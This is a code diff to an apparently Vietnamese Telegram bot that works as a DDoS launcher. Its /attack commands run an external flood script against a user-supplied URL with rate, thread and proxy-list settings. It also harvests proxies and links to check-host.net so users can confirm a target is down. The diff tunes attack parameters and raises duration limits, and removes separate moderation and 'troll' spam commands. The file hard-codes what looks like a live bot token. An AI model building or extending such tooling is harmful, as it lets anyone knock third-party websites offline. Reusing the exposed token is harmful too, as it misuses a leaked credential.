@@ -14,7 +14,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 TOKEN = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw'
 ADMIN_IDS = [7818408538]  # ID Admin
 USER_COOLDOWN = 5 *12  # 5 phut
-MAX_USER_DURATION = 120  # Gioi han thanh vien
+MAX_USER_DURATION = 200  # Gioi han thanh vien
 
 last_user_attack_time = {}
 active_processes = {}
@@ -41,7 +41,7 @@ async def start_attack(script, url, duration, rate, thread, proxy, user_id, cont
         process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_processes[user_id] = process
 
-        await context.bot.send_message(chat_id=chat_id, text=f"🚀 Attack started on {url} for {duration} seconds.")
+        await context.bot.send_message(chat_id=chat_id, text=f"🚀 Attack started Powerfull on {url} for {duration} seconds.")
         check_host_url = f"https://check-host.net/check-http?host={url}"
         keyboard = [[InlineKeyboardButton("🔗 Open Check Host", url=check_host_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -98,7 +98,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     script = os.path.join(os.getcwd(), 'c1.js')
     # attack them —cache
-    await start_attack(script, url, duration, '30', '5', '7.txt', user_id, context, chat_id, ['--cache'])
+    await start_attack(script, url, duration, '4', '5', '7.txt', user_id, context, chat_id, ['--cache'])
 
 async def clf(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -166,7 +166,7 @@ async def attackkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     script = os.path.join(os.getcwd(), 'c1.js')
     # attackkill them —cache
-    await start_attack(script, url, duration, '30', '4', 'proxy.txt', user_id, context, chat_id, ['--cache'])
+    await start_attack(script, url, duration, '4', '4', '7.txt', user_id, context, chat_id, ['--cache'])
 
 async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -426,7 +426,7 @@ async def getproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result = []
         for url in SOURCES:
             try:
-                r = requests.get(url, timeout=6)
+                r = requests.get(url, timeout=5)
                 if r.status_code == 200:
                     result.extend(r.text.strip().splitlines())
             except:
@@ -462,198 +462,44 @@ async def getproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logging.error(f"Loi getproxy: {e}")
         await context.bot.send_message(chat_id, "❌ Đa xay ra loi khi lay proxy.")
 
+#modulecheckwed
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    args = context.args
+
+    if len(args) != 1:
+        await context.bot.send_message(chat_id, "❌ Sai cú pháp. Dùng: /status <url>")
+        return
+
+    url = args[0]
+    if not url.startswith("http://") and not url.startswith("https://"):
+        url = "http://" + url  # tự thêm http nếu người dùng quên
+
+    await context.bot.send_message(chat_id, f"⌛ Đang kiểm tra {url}...")
+
+    try:
+        resp = requests.get(url, timeout=10)
+        status = resp.status_code
+        length = len(resp.text)
+        msg = f"🌐 Website: {url}\n✅ Status: {status}\n⏱ Thời gian phản hồi: {resp.elapsed.total_seconds():.2f}s\n📄 Độ dài nội dung: {length} ký tự"
+        await context.bot.send_message(chat_id, msg)
+    except requests.exceptions.RequestException as e:
+        await context.bot.send_message(chat_id, f"❌ Lỗi khi kiểm tra: {e}")    
+
 # ========== MAIN ==========
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
-
+    
     app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("attackkill", attackkill))
     app.add_handler(CommandHandler("kill", kill))
     app.add_handler(CommandHandler("clf", clf))
-    app.add_handler(CommandHandler("attackvip", attackvip))
     app.add_handler(CommandHandler("add", add_admin))
     app.add_handler(CommandHandler("nu", nu))
     app.add_handler(CommandHandler("fb", fb_lookup))
-    app.add_handler(CommandHandler("like", like_uid))
-    app.add_handler(CommandHandler("visit", visit))
     app.add_handler(CommandHandler("getproxy", getproxy))
-
-
+    app.add_handler(CommandHandler("status", status))
 
     app.run_polling()
 
 if __name__ == '__main__':
     main()
-    
-    # Anti bật/tắt
-ANTI_SETTINGS = {
-    "link": True,
-    "photo": True,
-    "badword": True,
-    "spam": True
-}
-
-# ========== LỆNH CƠ BẢN ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🤖 Bot đã hoạt động!\nDùng /menu để xem tất cả chức năng."
-    )
-
-async def mute(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.reply_to_message:
-        user = update.message.reply_to_message.from_user
-        await context.bot.restrict_chat_member(
-            update.effective_chat.id, user.id,
-            ChatPermissions(can_send_messages=False)
-        )
-        await update.message.reply_text(
-            f"🔇 {user.mention_html()} đã bị mute!", parse_mode="HTML"
-        )
-
-# ========== ANTI ==========
-async def antilink(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not ANTI_SETTINGS["link"]:
-        return
-    text = update.message.text or ""
-    if "http://" in text or "https://" in text or "t.me/" in text:
-        await update.message.delete()
-        await update.message.reply_text("🚫 Không được gửi link!")
-
-async def antipic(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not ANTI_SETTINGS["photo"]:
-        return
-    await update.message.delete()
-    await update.message.reply_text("📷 Cấm gửi ảnh!")
-
-async def antibad(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not ANTI_SETTINGS["badword"]:
-        return
-    text = update.message.text.lower()
-    if any(word in text for word in BAD_WORDS):
-        await update.message.delete()
-        await update.message.reply_text("🚫 Ngôn ngữ bị cấm!")
-
-async def antispam(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not ANTI_SETTINGS["spam"]:
-        return
-    user_id = update.message.from_user.id
-    chat_id = update.effective_chat.id
-
-    user_messages.setdefault(user_id, [])
-    user_messages[user_id].append(update.message.date.timestamp())
-
-    # Lọc tin nhắn trong 10s gần nhất
-    user_messages[user_id] = [
-        t for t in user_messages[user_id]
-        if update.message.date.timestamp() - t < 10
-    ]
-
-    if len(user_messages[user_id]) > SPAM_LIMIT:
-        await context.bot.restrict_chat_member(
-            chat_id, user_id,
-            ChatPermissions(can_send_messages=False)
-        )
-        await update.message.reply_text(
-            f"🚫 {update.message.from_user.mention_html()} spam quá nhiều!",
-            parse_mode="HTML"
-        )
-
-# ========== TROLL ==========
-async def spamcall(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 2:
-        await update.message.reply_text("Cách dùng: /spamcall số_lần số_điện_thoại")
-        return
-    times, phone = int(context.args[0]), context.args[1]
-    for i in range(times):
-        await update.message.reply_text(f"📞 Gọi troll {phone} lần {i+1}")
-
-async def spamsms(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 2:
-        await update.message.reply_text("Cách dùng: /spamsms số_lần số_điện_thoại")
-        return
-    times, phone = int(context.args[0]), context.args[1]
-    for i in range(times):
-        await update.message.reply_text(f"✉️ SMS troll {phone} lần {i+1}")
-
-async def war(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    for _ in range(5):
-        await update.message.reply_text("🔥 WAR 🔥 " * 10)
-
-# ========== ANTI ON/OFF ==========
-async def anti_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Bạn không có quyền!")
-        return
-
-    if len(context.args) < 2:
-        await update.message.reply_text("Cách dùng: /anti <link/photo/badword/spam> <on/off>")
-        return
-
-    feature, state = context.args[0].lower(), context.args[1].lower()
-    if feature not in ANTI_SETTINGS:
-        await update.message.reply_text("❌ Tính năng không tồn tại!")
-        return
-    if state not in ["on", "off"]:
-        await update.message.reply_text("❌ Chỉ nhận on hoặc off!")
-
-    ANTI_SETTINGS[feature] = state == "on"
-    await update.message.reply_text(f"✅ Tính năng {feature} đã {'bật' if state=='on' else 'tắt'}!")
-
-# ========== MENU ==========
-async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("⚙️ Quản lý", callback_data="manage")],
-        [InlineKeyboardButton("🛡 Anti", callback_data="anti")],
-        [InlineKeyboardButton("🤣 Troll", callback_data="troll")]
-    ]
-    await update.message.reply_text("📌 Chọn menu lệnh:", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-
-    if query.data == "manage":
-        await query.edit_message_text(
-            "⚙️ Lệnh Quản lý:\n"
-            "/mute (reply) → mute user\n"
-        )
-    elif query.data == "anti":
-        await query.edit_message_text(
-            "🛡 Lệnh Anti:\n"
-            "- Anti Link (xóa link)\n"
-            "- Anti Photo (xóa ảnh)\n"
-            "- Anti Badword (xóa từ cấm)\n"
-            "- Anti Spam (mute spammer)\n"
-            "Dùng: /anti <tên> <on/off> để bật/tắt"
-        )
-    elif query.data == "troll":
-        await query.edit_message_text(
-            "🤣 Lệnh Troll:\n"
-            "/war → spam war\n"
-            "/spamcall số_lần số → fake call troll\n"
-            "/spamsms số_lần số → fake sms troll"
-        )
-
-# ========== MAIN ==========
-app = ApplicationBuilder().token(TOKEN).build()
-
-# Lệnh cơ bản
-app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("menu", menu))
-app.add_handler(CommandHandler("mute", mute))
-app.add_handler(CommandHandler("spamcall", spamcall))
-app.add_handler(CommandHandler("spamsms", spamsms))
-app.add_handler(CommandHandler("war", war))
-app.add_handler(CommandHandler("anti", anti_toggle))
-
-# Callback menu
-app.add_handler(CallbackQueryHandler(button))
-
-# Quản lý group
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, antibad))
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, antilink))
-app.add_handler(MessageHandler(filters.PHOTO, antipic))
-app.add_handler(MessageHandler(filters.ALL, antispam))
-
-print("🤖 Bot đang chạy...")
-app.run_polling()
